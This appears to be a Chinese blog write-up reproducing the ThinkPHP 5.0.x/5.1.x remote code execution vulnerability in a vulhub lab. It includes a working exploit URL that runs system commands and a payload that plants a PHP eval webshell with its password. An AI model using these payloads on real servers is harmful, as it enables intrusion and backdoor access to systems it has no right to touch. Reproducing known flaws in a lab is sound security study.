---
title: 【Thinkphp漏洞复现】5.0.22-5.1.29远程代码执行漏洞
date: 2025-09-03
categories:
  - Web攻防
  - 靶场
  - 红队
image: images/30.webp
---
# 0x00 简介
ThinkPHP(FCS)是一个轻量级的中型框架， 是从Java的Struts结构移植过来的中文PHP开发框架。 它使用面向对象的开发结构和MVC模式， 并且模拟实现了Struts的标签库， 各方面都比较人性化，熟悉J2EE的开发人员相对比较容易上手，适合php框架初学者。ThinkPHP的宗旨是简化开发、 提高效率、 易于扩展， 其在对数据库的支持方面已经包括MySQL、 MSSQL、Sqlite、 PgSQL、Oracle， 以及PDO的支持。 ThinkPHP有着丰富的文档和示例， 框架的兼容性较强， 但是其功能有限，因此更适合用于中小项目的开发。
# 0x01 漏洞概述
ThinkPHP 5.0.x版本和5.1.x版本中存在远程代码执行漏洞， 该漏洞源于ThinkPHP在获取控制器名时未对用户提交的参数进行严格的过滤。 远程攻击者可通过输入‘＼ ’字符的方式调用任意方法利用该漏洞执行代码。
# 0x02 影响版本
thinkphp 5.0.x
thinkphp 5.1.x
# 0x03 环境搭建
## 1、 在docker容器里搭建环境
```
cd vulhub-master/thinkphp/5-rce/
```
## 2、 进入目录下， 启动环境
```
docker-compose up -d
```
## 3、 查看环境端口
```
docker ps -a
```
这里我使用的是我自己的Ubuntu系统搭建的。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125256.png)
直接访问以下链接即可。
```
http://192.168.197.140:8080/
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125352.png)
# 0x04 验证方式
GET方式尝试命令执行，具体请求如下：
```
http://192.168.197.140:8080/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125633.png)
# 0x05 利用方式
## 1、URL编码一句话木马内容：
```
echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%22x%22%5D%29%3F%3E%27%20%3Eshell.php%20
```
## 2. 直接访问连接：
```
http://192.168.197.140:8080/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%22x%22%5D%29%3F%3E%27%20%3Eshell.php%20
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125935.png)
## 3. 上传一句话木马:
```
webshell地址：http://192.168.197.140:8080/shell.php
password：x
```
## 4. 连接成功！！！
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903130030.png)
